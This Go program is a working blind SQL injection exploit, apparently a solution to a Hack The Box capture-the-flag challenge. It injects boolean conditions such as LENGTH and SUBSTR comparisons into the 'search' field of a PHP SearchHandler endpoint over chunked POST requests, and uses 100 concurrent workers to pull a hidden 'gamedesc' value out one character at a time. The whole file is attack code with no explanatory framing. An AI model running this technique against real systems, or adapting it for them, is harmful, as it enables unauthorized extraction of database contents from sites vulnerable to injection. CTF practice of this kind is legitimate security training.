package main

import (
	"bytes"
	"fmt"
	"os"
	"sync"

	"net/http"
)

const THREADS = 100

var guard = make(chan struct{}, THREADS)
var wg sync.WaitGroup
var baseUrl string

func oracle(reqBody string) bool {
	guard <- struct{}{}

	req, _ := http.NewRequest("POST", baseUrl+"/Controllers/Handlers/SearchHandler.php", bytes.NewBuffer([]byte(reqBody)))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.TransferEncoding = []string{"chunked"}

	res, err := (&http.Client{}).Do(req)

	if err != nil {
		<-guard
		return false
	}

	defer res.Body.Close()
	<-guard

	return res.StatusCode == 200
}

func testLength(length int) bool {
	return oracle(fmt.Sprintf("search=6' AND LENGTH(gamedesc) = %d-- -", length))
}

func testFlagCharacter(character byte, index int) bool {
	return oracle(fmt.Sprintf("search=6' AND SUBSTR(gamedesc, %d, 1) = '%c", index, character))
}

func main() {
	baseUrl = "http://" + os.Args[1]
	chars := "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$@_"

	length := 1

	for !testLength(length) {
		length++
	}

	flag := make([]byte, length)
	flag[0] = 'H'
	flag[1] = 'T'
	flag[2] = 'B'
	flag[3] = '{'
	flag[length-1] = '}'

	for _, r := range chars {
		for i := 0; i < length; i++ {
			wg.Add(1)

			go func(b byte, index int) {
				defer wg.Done()

				if flag[index] == 0 && testFlagCharacter(b, index+1) {
					flag[index] = b
				}
			}(byte(r), i)
		}
	}

	wg.Wait()

	fmt.Println(string(flag))
}
